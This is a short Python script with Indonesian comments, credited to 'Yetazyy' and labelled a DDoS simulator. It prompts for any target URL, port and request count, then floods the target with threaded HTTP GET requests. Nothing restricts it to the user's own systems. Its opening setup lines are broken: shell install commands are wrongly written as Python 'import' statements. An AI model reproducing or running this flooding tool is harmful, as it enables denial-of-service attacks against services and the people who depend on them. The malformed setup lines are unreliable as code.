import pkg update && pkg upgrade
import pkg install git
import pkg install python
import pip install requests
import git clone https://github.com/Yetazyyy/ddos-simulator.git
import cd ddos-simulator
import python ddos_sim.py
import requests
import threading
import time

# Nama Yetazyy
author = "Yetazyy"

# Fungsi untuk mengirim HTTP request
def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request sent to {url}, Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send request to {url}: {e}")

# Fungsi untuk mensimulasikan DDoS attack
def ddos_attack(url, num_requests):
    threads = []
    for i in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

    # Tunggu semua thread selesai
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print(f"Script By {author}🚀")

    # Input dari pengguna
    target_url = input("Masukkan URL target (contoh: https://example.com): ").strip()
    target_port = input("Masukkan port target (contoh: 443): ").strip()
    num_requests = int(input("Masukkan jumlah request yang ingin dikirim: ").strip())

    # Gabungkan URL dan port
    if target_port:
        target_url = f"{target_url}:{target_port}"

    print("\nMemulai simulasi DDoS...")
    start_time = time.time()
    ddos_attack(target_url, num_requests)
    end_time = time.time()
    print(f"\nSimulasi DDoS selesai dalam {end_time - start_time} detik.")
